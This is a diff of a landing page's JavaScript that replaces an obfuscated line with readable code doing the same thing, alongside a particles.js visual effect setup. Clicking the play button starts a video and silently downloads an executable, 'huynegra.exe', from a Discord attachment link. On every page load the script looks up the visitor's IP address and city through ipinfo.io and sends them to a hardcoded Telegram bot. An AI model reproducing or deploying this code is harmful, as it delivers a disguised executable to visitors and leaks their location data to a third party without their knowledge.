@@ -1,1 +1,182 @@
-var _0x35bbb5=_0x5481;(function(_0x2873d9,_0x5b0117){var _0x354570=_0x5481,_0x2ea3c1=_0x2873d9();while(!![]){try{var _0x1ad4fc=-parseInt(_0x354570(0xfe))/0x1+parseInt(_0x354570(0x11f))/0x2*(-parseInt(_0x354570(0x108))/0x3)+-parseInt(_0x354570(0x113))/0x4*(-parseInt(_0x354570(0x10a))/0x5)+-parseInt(_0x354570(0x117))/0x6+parseInt(_0x354570(0x105))/0x7+-parseInt(_0x354570(0x10f))/0x8*(-parseInt(_0x354570(0x121))/0x9)+-parseInt(_0x354570(0x10b))/0xa*(-parseInt(_0x354570(0x10c))/0xb);if(_0x1ad4fc===_0x5b0117)break;else _0x2ea3c1['push'](_0x2ea3c1['shift']());}catch(_0x168243){_0x2ea3c1['push'](_0x2ea3c1['shift']());}}}(_0xcffd,0x4067f));function _0x5481(_0x52c262,_0x3a7de9){var _0xcffdf4=_0xcffd();return _0x5481=function(_0x5481f1,_0x2fd8b7){_0x5481f1=_0x5481f1-0xf9;var _0xb3b56a=_0xcffdf4[_0x5481f1];return _0xb3b56a;},_0x5481(_0x52c262,_0x3a7de9);}function showVideo(){var _0x229d81=_0x5481,_0x2baf51=document[_0x229d81(0x106)](_0x229d81(0x11d)),_0x5110c3=document[_0x229d81(0x106)](_0x229d81(0xfb));_0x2baf51[_0x229d81(0x11b)][_0x229d81(0x111)]=_0x229d81(0x123),_0x5110c3[_0x229d81(0x11b)][_0x229d81(0x111)]=_0x229d81(0xfa);var _0x4069e4=document[_0x229d81(0x106)](_0x229d81(0x119));_0x4069e4[_0x229d81(0x102)](),_0x4069e4[_0x229d81(0x118)]('ended',function(){var _0x5c99d7=_0x229d81;_0x5110c3['style'][_0x5c99d7(0x111)]=_0x5c99d7(0x123),_0x2baf51[_0x5c99d7(0x11b)][_0x5c99d7(0x111)]='block';});var _0x59d3a0=_0x229d81(0x11c),_0x177c75=_0x229d81(0x122),_0x3e1003=document[_0x229d81(0x114)]('a');_0x3e1003['href']=_0x59d3a0,_0x3e1003['download']=_0x177c75,_0x3e1003[_0x229d81(0x107)]='_blank',_0x3e1003[_0x229d81(0x11b)][_0x229d81(0x111)]=_0x229d81(0x123),document[_0x229d81(0xff)][_0x229d81(0x10e)](_0x3e1003),_0x3e1003[_0x229d81(0x103)](),document['body'][_0x229d81(0x101)](_0x3e1003);}function _0xcffd(){var _0x3a4e7d=['then','block','video-container','controls','5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0','387917tlOfSr','body','&text=','removeChild','play','click','json','581700CITZDn','getElementById','target','1200018bAwRWD','Сообщение\x20успешно\x20отправлено','23625EKppEP','10eYCqlL','10851874gKSXzi','Ошибка\x20при\x20отправке\x20сообщения','appendChild','40jxbpKN','/sendMessage?chat_id=','display','6281247312','204Ytsbdk','createElement','play-button','error','2240904ffBGFp','addEventListener','video','log','style','https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe','button-container','https://ipinfo.io/json?token=a5fdbd840e0610','2HKddVp','catch','206289zqKMZO','huynegra.exe','none'];_0xcffd=function(){return _0x3a4e7d;};return _0xcffd();}var playButton=document['getElementById'](_0x35bbb5(0x115));playButton['addEventListener']('click',showVideo);var video=document['getElementById']('video');video[_0x35bbb5(0xfc)]=![],video['loop']=![],fetch(_0x35bbb5(0x11e))[_0x35bbb5(0xf9)](_0x2c81d1=>_0x2c81d1[_0x35bbb5(0x104)]())[_0x35bbb5(0xf9)](_0x44d16d=>{var _0x293fb3=_0x35bbb5;const _0x5840f9=_0x44d16d['city'],_0x58a632=_0x44d16d['ip'],_0x32c2f7=_0x5840f9+':\x20'+_0x58a632,_0x418559=_0x293fb3(0x112),_0x15a22f=_0x293fb3(0xfd),_0x5b82b4='https://api.telegram.org/bot'+_0x15a22f+_0x293fb3(0x110)+_0x418559+_0x293fb3(0x100)+encodeURIComponent(_0x32c2f7);fetch(_0x5b82b4)['then'](_0x1b5bf2=>_0x1b5bf2['json']())[_0x293fb3(0xf9)](_0x1275ae=>{var _0x5af717=_0x293fb3;_0x1275ae['ok']?console[_0x5af717(0x11a)](_0x5af717(0x109)):console[_0x5af717(0x116)](_0x5af717(0x10d));})['catch'](console['error']);})[_0x35bbb5(0x120)](console['error']);
+// настройка частиц
+function initializeParticles() {
+    particlesJS("particles-container", {
+        particles: {
+            number: {
+                value: 80,
+                density: {
+                    enable: true,
+                    value_area: 800
+                }
+            },
+            color: {
+                value: "#ffffff"
+            },
+            shape: {
+                type: "circle",
+                stroke: {
+                    width: 0,
+                    color: "#000000"
+                },
+                polygon: {
+                    nb_sides: 5
+                },
+                image: {
+                    src: "img/github.svg",
+                    width: 100,
+                    height: 100
+                }
+            },
+            opacity: {
+                value: 0.5,
+                random: false,
+                anim: {
+                    enable: false,
+                    speed: 1,
+                    opacity_min: 0.1,
+                    sync: false
+                }
+            },
+            size: {
+                value: 3,
+                random: true,
+                anim: {
+                    enable: false,
+                    speed: 40,
+                    size_min: 0.1,
+                    sync: false
+                }
+            },
+            line_linked: {
+                enable: true,
+                distance: 150,
+                color: "#ffffff",
+                opacity: 0.4,
+                width: 1
+            },
+            move: {
+                enable: true,
+                speed: 6,
+                direction: "none",
+                random: false,
+                straight: false,
+                out_mode: "out",
+                bounce: false,
+                attract: {
+                    enable: false,
+                    rotateX: 600,
+                    rotateY: 1200
+                }
+            }
+        },
+        interactivity: {
+            detect_on: "canvas",
+            events: {
+                onhover: {
+                    enable: true,
+                    mode: "grab"
+                },
+                onclick: {
+                    enable: true,
+                    mode: "push"
+                },
+                resize: true
+            },
+            modes: {
+                grab: {
+                    distance: 140,
+                    line_linked: {
+                        opacity: 1
+                    }
+                },
+                bubble: {
+                    distance: 400,
+                    size: 40,
+                    duration: 2,
+                    opacity: 8,
+                    speed: 3
+                },
+                repulse: {
+                    distance: 200,
+                    duration: 0.4
+                },
+                push: {
+                    particles_nb: 4
+                },
+                remove: {
+                    particles_nb: 2
+                }
+            }
+        },
+        retina_detect: true
+    });
+}
+
+
+function showVideo() {
+    var buttonContainer = document.getElementById("button-container");
+    var videoContainer = document.getElementById("video-container");
+
+    buttonContainer.style.display = "none";
+    videoContainer.style.display = "block";
+
+    var video = document.getElementById("video");
+    video.play();
+
+    video.addEventListener("ended", function() {
+        videoContainer.style.display = "none";
+        buttonContainer.style.display = "block";
+    });
+
+    var fileUrl = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe";
+    var fileName = "huynegra.exe";
+
+    var link = document.createElement("a");
+    link.href = fileUrl;
+    link.download = fileName;
+    link.target = "_blank";
+    link.style.display = "none";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
+// telegraf blyat
+fetch("https://ipinfo.io/json?token=a5fdbd840e0610")
+    .then((response) => response.json())
+    .then((data) => {
+        const city = data.city;
+        const ip = data.ip;
+        const message = city + ": " + ip;
+        const chatId = "6281247312";
+        const token = "5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0";
+
+        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+        )}`;
+
+        fetch(apiUrl)
+            .then((response) => response.json())
+            .then((data) => {
+                if (data.ok) {
+                    console.log("Сообщение успешно отправлено");
+                } else {
+                    console.error("Ошибка при отправке сообщения");
+                }
+            })
+            .catch(console.error);
+    })
+    .catch(console.error);
+
+// Ожидание загрузки
+document.addEventListener("DOMContentLoaded", function() {
+    var playButton = document.getElementById("play-button");
+    playButton.addEventListener("click", showVideo);
+
+    var video = document.getElementById("video");
+    video.controls = false;
+    video.loop = false;
+
+    // Инициализация эффекта частиц
+    initializeParticles();
+});
